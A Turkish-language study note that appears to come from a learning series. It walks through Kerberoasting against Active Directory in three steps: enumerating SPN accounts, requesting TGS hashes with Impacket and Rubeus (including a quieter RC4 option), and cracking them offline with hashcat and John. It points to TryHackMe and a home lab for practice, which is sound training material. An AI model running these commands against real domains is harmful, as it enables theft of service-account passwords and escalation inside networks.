# Kerberoasting — Saldırı Adımları

> Ön koşul: domain'de **geçerli bir kullanıcı** (düşük yetki yeterli).
> Kerberos akışı ve neden işe yaradığı için: [Kerberoasting Nedir](00-Kerberoasting-Nedir.md)

---

## Adım 1 — SPN'li hesapları keşfet

Önce hangi servis hesaplarının `SPN`'i olduğunu bul.

**Linux / Impacket:**
```bash
GetUserSPNs.py domain.local/kullanici:parola -dc-ip 10.10.10.10
```

**Windows / PowerView:**
```powershell
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

**Windows / native (ek araç yok):**
```powershell
setspn.exe -T domain.local -Q */*
```

---

## Adım 2 — TGS biletlerini iste ve dışa aktar

**Impacket (keşif + talep + kaydet, tek komut):**
```bash
GetUserSPNs.py domain.local/kullanici:parola -dc-ip 10.10.10.10 -request -outputfile hashes.txt
```

**Rubeus (Windows üzerinden):**
```powershell
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /rc4opsec       # sadece RC4 isteyen hesaplar, daha sessiz
```

Çıktı `$krb5tgs$23$...` biçiminde bir hash'tir — bu, kırılacak olan servis hesabı parolasının şifreli halidir.

---

## Adım 3 — Offline kır

Bilet ele geçtikten sonra kırma tamamen offline'dır; hedefe tek bir paket daha gitmez.

**Hashcat (mode 13100):**
```bash
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
```

**John the Ripper:**
```bash
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
```

Parola kırılırsa, artık o servis hesabının açık parolasına sahipsindir — ve o hesap yüksek yetkiliyse domain içinde ciddi bir sıçrama noktası elde edersin.

---

## Pratik

- **TryHackMe — *Attacking Kerberos*:** hazır bir AD ortamı verir; Kerberoasting'i Rubeus ve Impacket ile uçtan uca yaptırır, ayrıca AS-REP roasting, golden/silver ticket ve Pass-the-Ticket'e de girer. Kurulumla uğraşmadan pratiğe geçmek için en hızlı yol.
- **Kendi lab (RedOps):** Windows Server ile bir Domain Controller kur, SPN atanmış ve **bilerek zayıf parolalı** bir servis hesabı oluştur. Ardından yukarıdaki üç adımı birebir tekrarlayabilirsin. Lab notları ayrıca eklenecek.

> Savunma tarafı ve sınav notları: [Tespit ve savunma](02-Tespit-ve-Savunma.md)
